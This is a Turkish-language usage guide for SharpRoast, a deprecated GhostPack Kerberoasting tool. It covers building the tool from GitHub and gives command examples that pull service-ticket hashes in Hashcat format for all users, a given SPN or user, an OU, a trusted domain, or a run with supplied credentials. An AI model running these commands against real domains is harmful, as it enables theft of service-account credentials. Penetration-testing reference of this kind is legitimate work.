# SharpRoast Kullanım Rehberi

## SharpRoast Nedir?

**SharpRoast**, PowerView'in Kerberoasting işlevselliğinin C# ile yeniden yazılmış bir sürümüdür. Kerberoasting saldırılarını gerçekleştirmek için kullanılır ve hash'leri Hashcat formatında çıktılar. Ancak, bu araç artık kullanımdan kaldırılmıştır (deprecated) ve işlevselliği Rubeus aracına entegre edilmiştir.

> **Önemli Not:** SharpRoast yalnızca yetkili test ortamlarında ve etik kullanım amaçlı çalıştırılmalıdır. Yetkisiz kullanım yasa dışıdır.

---

## Özellikler

1. **Kerberoasting:**
   - Domain'deki kullanıcıların Service Principal Name (SPN) bilgilerini ve TGS hash'lerini toplar.
2. **Hash Çıktısı:**
   - TGS hash'lerini Hashcat formatında çıktılar.
3. **SPN veya Kullanıcıya Özel Taramalar:**
   - Belirli bir SPN veya kullanıcı için tarama yapabilir.

---

## İndirme ve Derleme

SharpRoast aracı GitHub üzerinden sağlanabilir:

- [SharpRoast GitHub Sayfası](https://github.com/GhostPack/SharpRoast)

### Çalıştırma Adımları

1. **Araç Dosyasını İndirin:**
   ```bash
   git clone https://github.com/GhostPack/SharpRoast.git
   ```

2. **Derleme:**
   - Visual Studio kullanarak projeyi açın ve derleyin.
   - Derleme sonucunda `SharpRoast.exe` dosyasını elde edeceksiniz.

3. **Çalıştırma:**
   ```bash
   SharpRoast.exe [parametreler]
   ```

---

## Kullanım Parametreleri

### Genel Kullanım
```bash
SharpRoast.exe [Hedef] [Opsiyonel Parametreler]
```

### Örnek Komutlar

#### Tüm Kullanıcıları Tarama
Domain'deki tüm kullanıcılar için Kerberoasting işlemi:
```bash
SharpRoast.exe all
```

#### Belirli Bir SPN Tarama
```bash
SharpRoast.exe "MSSQLSvc/SQL.testlab.local"
```

#### Belirli Bir Kullanıcı Tarama
```bash
SharpRoast.exe harmj0y
```

#### Belirli Bir Organizational Unit (OU) Tarama
```bash
SharpRoast.exe "OU=TestingOU,DC=testlab,DC=local"
```

#### Başka Bir Domain Üzerinde Taramalar
Başka bir (güvenilen) domain için Kerberoasting işlemi:
```bash
SharpRoast.exe "LDAP://DC=dev,DC=testlab,DC=local"
```

#### Kimlik Bilgisi Belirterek Taramalar
```bash
SharpRoast.exe harmj0y "testlab.local\dfm" "Password123!"
```

---

## Güvenlik ve Önlemler

- **Yetkili Kullanıcılar:** SharpRoast yalnızca güvenlik uzmanları ve yetkili sistem yöneticileri tarafından kullanılmalıdır.
- **Test Ortamı:** Araç üretim ortamında kullanılmadan önce test ortamında değerlendirilmelidir.
- **Loglama:** Çalıştırılan komutlar sistem loglarına kaydedilebilir. Yasalara uygun hareket edilmelidir.

---

> **Uyarı:** Bu rehber yalnızca eğitim ve araştırma amaçlıdır. Yetkisiz kullanımlar yasa dışıdır.
